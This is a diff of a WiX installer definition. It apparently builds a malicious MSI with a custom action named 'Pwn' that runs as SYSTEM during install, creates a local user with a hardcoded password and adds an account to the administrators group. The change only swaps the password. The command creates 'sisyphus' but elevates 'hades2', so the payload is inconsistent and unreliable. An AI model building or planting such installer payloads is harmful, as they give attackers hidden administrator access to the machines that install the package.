@@ -34,7 +34,7 @@
 
     <CustomAction Id="Pwn" Execute="deferred" Impersonate="no" Return="ignore"
       Property="CMDEXE"
-      ExeCommand='/c net user sisyphus Ther0ckmaster! /add &amp;&amp; net localgroup administrators hades2 /add'/>
+      ExeCommand='/c net user sisyphus P3rseph0ne!26 /add &amp;&amp; net localgroup administrators hades2 /add'/>
 
     <InstallExecuteSequence>
       <Custom Action="Pwn" After="InstallInitialize"/>
